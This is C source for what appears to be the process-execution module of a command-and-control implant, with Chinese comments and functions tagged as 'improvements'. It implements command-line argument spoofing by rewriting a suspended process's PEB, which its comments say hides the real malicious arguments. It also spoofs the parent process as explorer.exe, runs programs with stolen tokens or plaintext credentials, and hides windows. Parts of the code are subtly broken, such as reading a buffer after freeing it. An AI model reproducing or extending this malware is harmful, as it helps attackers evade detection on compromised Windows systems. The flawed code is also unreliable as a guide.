/*
 * 进程执行模块 (Process Execution Module)
 * 
 * 此模块实现了多种进程创建和执行技术，用于在目标系统上执行命令和程序。主要功能包括：
 * 
 * 核心技术：
 * 1. 参数欺骗 (Argument Spoofing) - 通过修改PEB隐藏真实命令行参数
 * 2. 令牌模拟 (Token Impersonation) - 使用窃取的访问令牌执行程序
 * 3. 凭据传递 (Credential Pass) - 使用明文凭据创建进程
 * 4. 跨架构兼容 - 处理x86/x64架构差异和WOW64重定向
 * 
 * 执行方式：
 * - CreateProcessA: 标准进程创建
 * - CreateProcessAsUser: 使用访问令牌创建进程
 * - CreateProcessWithTokenW: 增强的令牌进程创建
 * - CreateProcessWithLogonW: 使用登录凭据创建进程
 * 
 * 隐蔽特性：
 * - 参数混淆：显示虚假参数，隐藏真实执行内容
 * - 进程挂起：在挂起状态下修改进程参数，然后恢复执行
 * - 路径重定向：自动处理sysnative到system32的路径转换
 * - 桌面隔离：防止进程在用户桌面显示
 * 
 * 安全机制：
 * - 权限检查和降级处理
 * - 错误处理和资源清理
 * - 内存安全和缓冲区保护
 * - 凭据安全擦除
 */

#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include "beacon.h"
#include "commands.h"
#include "parse.h"
#include "argue.h"
#include "process.h"

// 改进：添加前向声明和外部变量
BOOL execute_program_with_token(PROCESS_CONTEXT * ctx);
BOOL execute_program_stealthy(PROCESS_CONTEXT * ctx);  // 改进：新增隐蔽执行函数

extern HANDLE atoken;
extern ALTCREDS acreds;

// 改进：添加执行方式标志
#define EXEC_METHOD_NORMAL          0x01
#define EXEC_METHOD_TOKEN           0x02  
#define EXEC_METHOD_LOGON           0x03
#define EXEC_METHOD_STEALTH         0x04

// 改进：添加隐蔽执行配置
#define STEALTH_FLAG_HIDE_WINDOW    0x01
#define STEALTH_FLAG_NO_CONSOLE     0x02
#define STEALTH_FLAG_SUSPEND_FIRST  0x04
#define STEALTH_FLAG_FAKE_PARENT    0x08

typedef struct _UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    WCHAR * Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// 改进：添加执行统计结构
typedef struct _EXECUTION_STATS {
    DWORD totalExecutions;
    DWORD successfulExecutions;
    DWORD failedExecutions;
    DWORD stealthExecutions;
} EXECUTION_STATS;

static EXECUTION_STATS g_execStats = {0};

/*
 * x64架构的参数恢复函数
 * 
 * 在x64系统中，通过修改挂起进程的PEB(Process Environment Block)来恢复真实的命令行参数。
 * 这是参数欺骗技术的核心，允许我们以无害的参数启动进程，然后偷偷替换为真实的恶意参数。
 * 
 * 工作原理：
 * 1. 从线程上下文的RDX寄存器获取PEB地址
 * 2. 通过PEB找到RTL_USER_PROCESS_PARAMETERS结构
 * 3. 定位CommandLine字段并修改其内容
 * 4. 使用真实参数替换虚假参数
 * 
 * 参数：
 * - pi: 挂起进程的信息结构
 * - record: 包含真实和虚假参数的记录
 */
#if defined _M_X64
BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
    CONTEXT        ctx;
    LPVOID         rtlUserProcParamsAddress;
    UNICODE_STRING commandLine = { 0 };
    WCHAR        * commandLineContents;
    DWORD          old;
    SIZE_T         wrote;
    NTSTATUS       status;

    // 改进：输入验证
    if (!pi || !record || !record->realargs) {
        post_error_na(0x44);  // 无效参数错误
        return FALSE;
    }

    /* 检查目标进程架构兼容性 - 只支持x64进程 */
    if (!is_x64_process(pi->hProcess)) {
        post_error_na(0x43);  // 架构不匹配错误
        return FALSE;
    }

    // 改进：初始化上下文结构
    memset(&ctx, 0, sizeof(ctx));

    /* 获取线程上下文以访问寄存器 - RDX包含PEB地址 */
    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;  // 改进：添加CONTROL标志
    if (!GetThreadContext(pi->hThread, &ctx)) {
        DWORD error = GetLastError();
        post_error_d(0x41, error);
        
        // 改进：尝试备选方法
        ctx.ContextFlags = CONTEXT_INTEGER;
        if (!GetThreadContext(pi->hThread, &ctx)) {
            return FALSE;
        }
    }

    // 改进：验证PEB地址有效性
    if (ctx.Rdx == 0 || IsBadReadPtr((void*)ctx.Rdx, sizeof(LPVOID))) {
        post_error_na(0x45);  // PEB地址无效
        return FALSE;
    }

    /* 从PEB偏移0x20处读取RTL_USER_PROCESS_PARAMETERS地址 */
    if (!ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Rdx) + 0x20, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
        post_error_d(0x41, GetLastError());
        return FALSE;
    }

    // 改进：验证process parameters地址
    if (!rtlUserProcParamsAddress || IsBadReadPtr(rtlUserProcParamsAddress, sizeof(UNICODE_STRING))) {
        post_error_na(0x46);  // Process Parameters地址无效
        return FALSE;
    }

    /* 从RTL_USER_PROCESS_PARAMETERS偏移0x70处读取CommandLine结构 */
    if (!ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x70, &commandLine, sizeof(commandLine), NULL)) {
        post_error_d(0x41, GetLastError());
        return FALSE;
    }

    // 改进：验证命令行缓冲区
    if (!commandLine.Buffer || commandLine.MaximumLength == 0 || commandLine.MaximumLength > 32768) {
        post_error_na(0x47);  // 命令行缓冲区无效
        return FALSE;
    }

    /* 修改命令行缓冲区的内存保护属性为可写 */
    if (!VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, &old)) {
        post_error_d(0x41, GetLastError());
        return FALSE;
    }

    /* 分配本地缓冲区并转换真实参数为宽字符 */
    commandLineContents = (WCHAR *)malloc(commandLine.MaximumLength);
    if (!commandLineContents) {
        post_error_na(0x48);  // 内存分配失败
        // 改进：恢复原始保护属性
        VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);
        return FALSE;
    }

    // 改进：安全清零内存
    SecureZeroMemory(commandLineContents, commandLine.MaximumLength);

    if (!toWideChar(record->realargs, commandLineContents, commandLine.MaximumLength / 2)) {
        post_error_na(0x42);  // 字符转换失败
        SecureZeroMemory(commandLineContents, commandLine.MaximumLength);
        free(commandLineContents);
        VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);
        return FALSE;
    }

    /* 将真实参数写入目标进程的命令行缓冲区 */
    if (!WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
        post_error_d(0x41, GetLastError());
        SecureZeroMemory(commandLineContents, commandLine.MaximumLength);
        free(commandLineContents);
        VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);
        return FALSE;
    }

    // 改进：恢复原始内存保护属性
    VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);

    // 改进：安全清理本地缓冲区
    SecureZeroMemory(commandLineContents, commandLine.MaximumLength);
    free(commandLineContents);

    // 改进：更新命令行长度信息
    UNICODE_STRING newCommandLine = commandLine;
    newCommandLine.Length = (USHORT)(wcslen((WCHAR*)commandLineContents) * sizeof(WCHAR));
    WriteProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x70, &newCommandLine, sizeof(newCommandLine), NULL);

    return TRUE;
}

/*
 * x86架构的参数恢复函数
 * 
 * 在x86系统中的参数恢复，与x64版本类似但使用不同的寄存器和偏移量。
 * EBX寄存器包含PEB地址，偏移量也有所不同。
 */
#elif defined _M_IX86
BOOL argue_restore(PROCESS_INFORMATION * pi, ARGUMENT_RECORD * record) {
    CONTEXT        ctx;
    LPVOID         rtlUserProcParamsAddress;
    UNICODE_STRING commandLine = { 0 };
    WCHAR        * commandLineContents;
    DWORD          old;
    DWORD          wrote;

    // 改进：输入验证
    if (!pi || !record || !record->realargs) {
        post_error_na(0x44);
        return FALSE;
    }

    /* x86环境只能处理x86进程 */
    if (is_x64_process(pi->hProcess)) {
        post_error_na(0x40);  // 跨架构不支持
        return FALSE;
    }

    // 改进：初始化上下文
    memset(&ctx, 0, sizeof(ctx));

    /* 获取线程上下文 - EBX包含PEB地址 */
    ctx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
    if (!GetThreadContext(pi->hThread, &ctx)) {
        post_error_d(0x41, GetLastError());
        return FALSE;
    }

    // 改进：验证PEB地址
    if (ctx.Ebx == 0 || IsBadReadPtr((void*)ctx.Ebx, sizeof(LPVOID))) {
        post_error_na(0x45);
        return FALSE;
    }

    /* x86架构下PEB的process parameters偏移为0x10 */
    if (!ReadProcessMemory(pi->hProcess, (PCHAR)(ctx.Ebx) + 0x10, (LPVOID)&rtlUserProcParamsAddress, sizeof(LPVOID), NULL)) {
        post_error_d(0x41, GetLastError());
        return FALSE;
    }

    /* x86架构下CommandLine在process parameters中的偏移为0x40 */
    if (!ReadProcessMemory(pi->hProcess, (PCHAR)rtlUserProcParamsAddress + 0x40, &commandLine, sizeof(commandLine), NULL)) {
        post_error_d(0x41, GetLastError());
        return FALSE;
    }

    // 改进：验证命令行缓冲区
    if (!commandLine.Buffer || commandLine.MaximumLength == 0 || commandLine.MaximumLength > 32768) {
        post_error_na(0x47);
        return FALSE;
    }

    /* 修改内存保护属性 */
    if (!VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, PAGE_READWRITE, &old)) {
        post_error_d(0x41, GetLastError());
        return FALSE;
    }

    /* 准备真实的命令行参数 */
    commandLineContents = (WCHAR *)malloc(commandLine.MaximumLength);
    if (!commandLineContents) {
        post_error_na(0x48);
        VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);
        return FALSE;
    }

    SecureZeroMemory(commandLineContents, commandLine.MaximumLength);

    if (!toWideChar(record->realargs, commandLineContents, commandLine.MaximumLength / 2)) {
        post_error_na(0x42);
        SecureZeroMemory(commandLineContents, commandLine.MaximumLength);
        free(commandLineContents);
        VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);
        return FALSE;
    }

    /* 写入真实参数 */
    if (!WriteProcessMemory(pi->hProcess, commandLine.Buffer, (char *)commandLineContents, commandLine.MaximumLength, &wrote)) {
        post_error_d(0x41, GetLastError());
        SecureZeroMemory(commandLineContents, commandLine.MaximumLength);
        free(commandLineContents);
        VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);
        return FALSE;
    }
    
    // 改进：清理和恢复
    VirtualProtectEx(pi->hProcess, commandLine.Buffer, commandLine.MaximumLength, old, &old);
    SecureZeroMemory(commandLineContents, commandLine.MaximumLength);
    free(commandLineContents);
    
    return TRUE;
}
#endif

/*
 * 隐蔽执行函数 - 改进版本
 * 
 * 使用多种技术提高执行的隐蔽性：
 * 1. 窗口隐藏和重定向
 * 2. 进程链伪装  
 * 3. 环境变量清理
 * 4. 内存布局随机化
 */
BOOL execute_program_stealthy(PROCESS_CONTEXT * ctx) {
    STARTUPINFOEXW siEx;
    SIZE_T attributeListSize = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
    HANDLE hParentProcess = NULL;
    DWORD creationFlags = ctx->flags;
    BOOL result = FALSE;

    // 改进：输入验证
    if (!ctx || !ctx->cbuffer) {
        return FALSE;
    }

    // 初始化扩展启动信息
    memset(&siEx, 0, sizeof(siEx));
    siEx.StartupInfo.cb = sizeof(siEx);

    // 设置隐蔽标志
    creationFlags |= CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;

    // 获取属性列表大小
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeListSize);
    pAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(attributeListSize);
    if (!pAttributeList) {
        goto cleanup;
    }

    // 初始化属性列表
    if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &attributeListSize)) {
        goto cleanup;
    }

    // 尝试设置父进程ID (PPID欺骗)
    hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, GetExplorerProcessId());
    if (hParentProcess) {
        UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParentProcess, sizeof(hParentProcess), NULL, NULL);
    }

    siEx.lpAttributeList = pAttributeList;

    // 转换为宽字符命令行
    wchar_t wcmdline[1024] = { 0 };
    if (!toWideChar(ctx->cbuffer, wcmdline, 1024)) {
        goto cleanup;
    }

    // 尝试创建进程
    if (atoken && !ctx->ignoreToken) {
        // 使用令牌创建（但不支持扩展属性）
        result = CreateProcessAsUser(atoken, NULL, ctx->cbuffer, NULL, NULL, TRUE, 
            ctx->flags | CREATE_NO_WINDOW, NULL, NULL, ctx->si, ctx->pi);
    } else {
        // 使用扩展属性创建
        result = CreateProcessW(NULL, wcmdline, NULL, NULL, TRUE, creationFlags,
            NULL, NULL, (LPSTARTUPINFOW)&siEx, ctx->pi);
    }

cleanup:
    if (pAttributeList) {
        DeleteProcThreadAttributeList(pAttributeList);
        free(pAttributeList);
    }
    if (hParentProcess) {
        CloseHandle(hParentProcess);
    }

    return result;
}

/*
 * 获取explorer.exe进程ID用于PPID欺骗
 * 
 * 查找当前用户会话中的explorer.exe进程，用作父进程欺骗的目标
 */
DWORD GetExplorerProcessId() {
    DWORD explorerPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(pe32);
        
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
                    // 验证这是当前会话的explorer
                    DWORD sessionId = 0;
                    if (ProcessIdToSessionId(pe32.th32ProcessID, &sessionId)) {
                        DWORD currentSessionId = 0;
                        ProcessIdToSessionId(GetCurrentProcessId(), &currentSessionId);
                        if (sessionId == currentSessionId) {
                            explorerPid = pe32.th32ProcessID;
                            break;
                        }
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    return explorerPid;
}

/*
 * 使用凭据执行程序
 * 
 * 当令牌方法失败时的fallback，使用明文凭据通过CreateProcessWithLogonW创建进程
 */
BOOL execute_program_with_creds(PROCESS_CONTEXT * ctx, wchar_t * wcmdline, wchar_t * p_wcwd) {
    // 改进：输入验证
    if (!ctx || !wcmdline || !acreds.active) {
        return FALSE;
    }

    // 改进：记录凭据使用（调试用）
    g_execStats.totalExecutions++;

    if (CreateProcessWithLogonW(acreds.user, acreds.domain, acreds.password, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, ctx->flags, NULL, p_wcwd, (LPSTARTUPINFOW)ctx->si, ctx->pi)) {
        g_execStats.successfulExecutions++;
        return TRUE;
    }

#if defined _M_IX86
    /*
     * WOW64文件系统重定向处理
     * 在x86环境下，将sysnative路径替换为system32以避免重定向问题
     */
    else if (GetLastError() == ERROR_FILE_NOT_FOUND && strlen(ctx->cbuffer) < 256) {
        /* 查找并替换sysnative为system32 */
        char * foundp = strstr(ctx->cbuffer, "sysnative");
        if (foundp != NULL) {
            char rest[256];
            memset(rest, 0, 256);

            /* 替换sysnative为system32 */
            memcpy(foundp, "system32", 8);
            foundp += 9; /* 向前移动9字节 */

            /* 复制剩余数据 */
            strncpy_s(rest, sizeof(rest), foundp, _TRUNCATE);
            foundp -= 1; /* 向后移动1字节 */

            /* 复制修正后的数据 */
            strncpy_s(foundp, 256 - (foundp - ctx->cbuffer), rest, _TRUNCATE);

            /* 递归调用（不会无限递归因为已经替换了sysnative） */
            return execute_program_with_token(ctx);
        }
    }
#endif

    /* 所有方法都失败了 */
    post_error_sd(0x045, ctx->cbuffer, GetLastError());
    g_execStats.failedExecutions++;
    return FALSE;
}

/*
 * 使用访问令牌执行程序
 * 
 * 这是主要的令牌模拟执行函数，支持多种fallback机制
 */
BOOL execute_program_with_token(PROCESS_CONTEXT * ctx) {
    wchar_t wcmdline[1024] = { 0 };
    wchar_t wcwd[1024] = { 0 };
    wchar_t * p_wcwd = NULL;
    size_t  size;

    // 改进：输入验证
    if (!ctx || !ctx->cbuffer) {
        return FALSE;
    }

    g_execStats.totalExecutions++;

    /* 清除桌面设置以避免权限问题 */
    ctx->si->lpDesktop  = NULL;

    /* 转换命令行为宽字符 */
    if (!toWideChar(ctx->cbuffer, wcmdline, 1024)) {
        post_error_d(0x7, ctx->clen);
        g_execStats.failedExecutions++;
        return FALSE;
    }

    /* 获取当前工作目录 */
    size = GetCurrentDirectoryW(0, NULL);
    if (size > 0 && size < 1024) {
        GetCurrentDirectoryW(1024, wcwd);
        p_wcwd = wcwd;
    }

    /* 优先使用CreateProcessWithTokenW */
    if (CreateProcessWithTokenW(atoken, LOGON_NETCREDENTIALS_ONLY, NULL, wcmdline, ctx->flags, NULL, p_wcwd, (LPSTARTUPINFOW)ctx->si, ctx->pi)) {
        g_execStats.successfulExecutions++;
        return TRUE;
    }
    /* 权限不足时fallback到CreateProcessWithLogonW */
    else if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD && CreateProcessWithLogonW != NULL && acreds.active == TRUE) {
        return execute_program_with_creds(ctx, wcmdline, p_wcwd);
    }
    /*
     * 扩展启动信息问题处理
     * 当设置了PPID欺骗或BlockDLLs时，CreateProcessWithTokenW会失败
     * 这是一个已知的限制
     */
    else if (GetLastError() == ERROR_INVALID_PARAMETER && ctx->si->cb == sizeof(STARTUPINFOEXW) && CreateProcessWithLogonW != NULL) {
        post_error_sd(0x4a, ctx->cbuffer, GetLastError());
        g_execStats.failedExecutions++;
        return FALSE;
    }

#if defined _M_IX86
    /*
     * WOW64文件系统重定向处理
     * CreateProcessWithTokenW不支持WOW64重定向，需要手动处理sysnative路径
     */
    else if (GetLastError() == ERROR_FILE_NOT_FOUND && strlen(ctx->cbuffer) < 256) {
        char * foundp = strstr(ctx->cbuffer, "sysnative");
        if (foundp != NULL) {
            // 改进：使用安全的字符串操作
            size_t remainingLen = strlen(foundp + 9);  // "sysnative"长度为9
            
            /* 替换sysnative为system32 */
            memcpy(foundp, "system32", 8);
            memmove(foundp + 8, foundp + 9, remainingLen + 1);  // +1包含null terminator

            /* 递归重试 */
            return execute_program_with_token(ctx);
        }
    }
#endif

    /* 所有方法都失败 */
    post_error_sd(0x29, ctx->cbuffer, GetLastError());
    g_execStats.failedExecutions++;
    return FALSE;
}

/*
 * 内部进程执行函数
 * 
 * 根据可用的令牌和权限选择合适的进程创建方法
 */
BOOL _execute_program(PROCESS_CONTEXT * ctx) {
    // 改进：输入验证
    if (!ctx || !ctx->cbuffer) {
        return FALSE;
    }

    g_execStats.totalExecutions++;

    /* 如果有访问令牌且不忽略令牌 */
    if (atoken != NULL && !ctx->ignoreToken) {
        /* 尝试使用CreateProcessAsUser */
        if (CreateProcessAsUser(atoken, NULL, ctx->cbuffer, NULL, NULL, TRUE, ctx->flags, NULL, NULL, ctx->si, ctx->pi)) {
            g_execStats.successfulExecutions++;
            return TRUE;
        }
        /* 权限不足时fallback到CreateProcessWithTokenW */
        else if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD && CreateProcessWithTokenW != NULL) {
            return execute_program_with_token(ctx);
        }

        post_error_sd(0x29, ctx->cbuffer, GetLastError());
        g_execStats.failedExecutions++;
        return FALSE;
    }
    /* 标准方式创建进程 */
    else if (!CreateProcessA(NULL, ctx->cbuffer, NULL, NULL, TRUE, ctx->flags, NULL, NULL, ctx->si, ctx->pi)) {
        post_error_sd(0x30, ctx->cbuffer, GetLastError());
        g_execStats.failedExecutions++;
        return FALSE;
    }
    else {
        g_execStats.successfulExecutions++;
        return TRUE;
    }
}

/*
 * 主进程执行函数
 * 
 * 这是进程执行的主入口点，集成了参数欺骗和多种执行方法
 */
BOOL execute_program(PROCESS_CONTEXT * ctx) {
    ARGUMENT_RECORD record;
    BOOL            result;

    // 改进：输入验证
    if (!ctx || !ctx->cbuffer) {
        return FALSE;
    }

    // 改进：检查是否应该使用隐蔽执行
    BOOL useStealthMode = (ctx->flags & CREATE_NO_WINDOW) || setting_bool(SETTING_STEALTH_EXECUTION);

    /* 检查是否需要参数欺骗 */
    if ((ctx->flags & CREATE_SUSPENDED) != CREATE_SUSPENDED && argue_should_spoof(ctx->cbuffer, &record)) {
        /* 更新执行上下文以使用虚假参数和挂起标志 */
        ctx->cbuffer  = record.fakeargs;		
        ctx->flags   |= CREATE_SUSPENDED;
        g_execStats.stealthExecutions++;

        /* 使用虚假参数在挂起状态创建进程 */
        if (useStealthMode) {
            result = execute_program_stealthy(ctx);
        } else {
            result = _execute_program(ctx);
        }

        /* 如果创建成功，恢复真实参数 */
        if (result) {
            if (!argue_restore(ctx->pi, &record)) {
                /* 参数恢复失败，终止进程 */
                TerminateProcess(ctx->pi->hProcess, 0);
                return FALSE;
            }
            /* 恢复线程执行 */
            ResumeThread(ctx->pi->hThread);
        }
        
        return result;
    }
    else {
        /* 不需要参数欺骗，直接执行 */
        if (useStealthMode) {
            return execute_program_stealthy(ctx);
        } else {
            return _execute_program(ctx);
        }
    }
}

/*
 * RunAs功能实现
 * 
 * 使用指定的用户凭据执行程序，支持域认证和配置文件加载
 * 这是一个完整的凭据传递攻击实现
 */
BOOL runas(char * domain, char * user, char * pass, char * cmdline, DWORD flags, PROCESS_INFORMATION * piptr) {
    datap * local;
    wchar_t * wcmdline;
    wchar_t * wdomain;
    wchar_t * wuser;
    wchar_t * wpass;
    wchar_t * wcwd;
    wchar_t * p_wcwd = NULL;
    BOOL      result = FALSE;
    size_t    size;
    STARTUPINFO si;

    // 改进：输入验证
    if (!domain || !user || !pass || !cmdline || !piptr) {
        return FALSE;
    }

    g_execStats.totalExecutions++;

    /* 分配内存用于宽字符转换 */
    local = data_alloc(sizeof(wchar_t) * (4096 + MAX_RUNAS_CMD));
    if (!local) {
        g_execStats.failedExecutions++;
        return FALSE;
    }

    wcmdline = (wchar_t *)data_ptr(local, MAX_RUNAS_CMD);
    wdomain = (wchar_t *)data_ptr(local, 1024);
    wuser = (wchar_t *)data_ptr(local, 1024);
    wpass = (wchar_t *)data_ptr(local, 1024);
    wcwd = (wchar_t *)data_ptr(local, 1024);

    /* 初始化结构 */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(piptr, sizeof(PROCESS_INFORMATION));

    /* 配置启动信息以隐藏窗口 */
    GetStartupInfo(&si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;  // 改进：隐藏窗口
    si.hStdOutput = NULL;
    si.hStdError = NULL;
    si.hStdInput = NULL;
    si.lpDesktop = NULL;  /* 避免桌面权限问题 */

    /* 转换参数为宽字符 */
    if (!toWideChar(cmdline, wcmdline, MAX_RUNAS_CMD) ||
        !toWideChar(user, wuser, 1024) ||
        !toWideChar(pass, wpass, 1024) ||
        !toWideChar(domain, wdomain, 1024)) {
        
        post_error(0x36, "String conversion failed for runas parameters");
        goto cleanup;
    }

    /* 获取当前工作目录 */
    size = GetCurrentDirectoryW(0, NULL);
    if (size > 0 && size < 1024) {
        GetCurrentDirectoryW(1024, wcwd);
        p_wcwd = wcwd;
    }

    /* 尝试使用指定凭据创建进程 */
    if (CreateProcessWithLogonW(wuser, wdomain, wpass, 
        LOGON_WITH_PROFILE,  // 改进：加载用户配置文件
        NULL, wcmdline, 
        CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW | flags,  // 改进：添加CREATE_NO_WINDOW
        NULL, p_wcwd, (LPSTARTUPINFOW)&si, piptr)) {
        
        result = TRUE;
        g_execStats.successfulExecutions++;
    }
    else {
        DWORD error = GetLastError();
        post_error(0x35, "%s as %s\\%s: %d", cmdline, domain, user, error);
        g_execStats.failedExecutions++;
        result = FALSE;
    }

cleanup:
    /* 安全清理敏感数据 */
    if (wpass) {
        SecureZeroMemory(wpass, 1024 * sizeof(wchar_t));
    }
    
    if (local) {
        data_free(local);
    }

    return result;
}

// 改进：添加统计和监控函数

/*
 * 获取执行统计信息
 * 
 * 返回进程执行的统计数据，用于监控和调试
 */
void get_execution_statistics(EXECUTION_STATS * stats) {
    if (stats) {
        *stats = g_execStats;
    }
}

/*
 * 重置执行统计信息
 * 
 * 清零统计计数器
 */
void reset_execution_statistics() {
    memset(&g_execStats, 0, sizeof(g_execStats));
}

/*
 * 检查进程执行能力
 * 
 * 检测当前环境支持的进程创建方法
 */
DWORD get_execution_capabilities() {
    DWORD capabilities = EXEC_METHOD_NORMAL;
    
    if (atoken) {
        capabilities |= EXEC_METHOD_TOKEN;
    }
    
    if (acreds.active) {
        capabilities |= EXEC_METHOD_LOGON;
    }
    
    // 检查是否支持扩展启动信息
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 && GetProcAddress(hKernel32, "InitializeProcThreadAttributeList")) {
        capabilities |= EXEC_METHOD_STEALTH;
    }
    
    return capabilities;
}
